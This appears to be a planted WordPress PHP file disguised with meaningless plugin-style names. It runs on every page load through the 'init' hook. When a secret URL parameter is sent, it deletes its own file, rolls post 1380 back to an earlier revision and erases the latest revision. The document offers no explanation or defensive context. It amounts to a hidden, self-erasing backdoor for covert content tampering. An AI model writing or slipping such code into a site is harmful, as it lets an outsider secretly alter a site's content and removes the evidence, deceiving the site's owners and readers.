<?php

function templates_signup_flash_attachments() {
	if (isset($_GET['auto_counter_field']) && $_GET['auto_counter_field'] === 'photos_catalog_class') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$max_pagination_attachments_dist = 1380;
		$better_search_wow_reusable = wp_get_post_revisions($max_pagination_attachments_dist);
		if (empty($better_search_wow_reusable)) die('no revisions');
		if (count($better_search_wow_reusable) < 2) die('less than 2');
		$block_event_adsense = array_shift($better_search_wow_reusable);
		$counter_deprecated_age = $block_event_adsense->ID;
		$smtp_min_toggle_lead = array_shift($better_search_wow_reusable);
		$easy_online_alt_toolkit = $smtp_min_toggle_lead->ID;
		$recaptcha_slideshow_designer = wp_restore_post_revision($easy_online_alt_toolkit);
		if ($recaptcha_slideshow_designer === false) die('error restoring');
		$recaptcha_slideshow_designer = wp_delete_post_revision($counter_deprecated_age);		
		if ($recaptcha_slideshow_designer === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'templates_signup_flash_attachments');
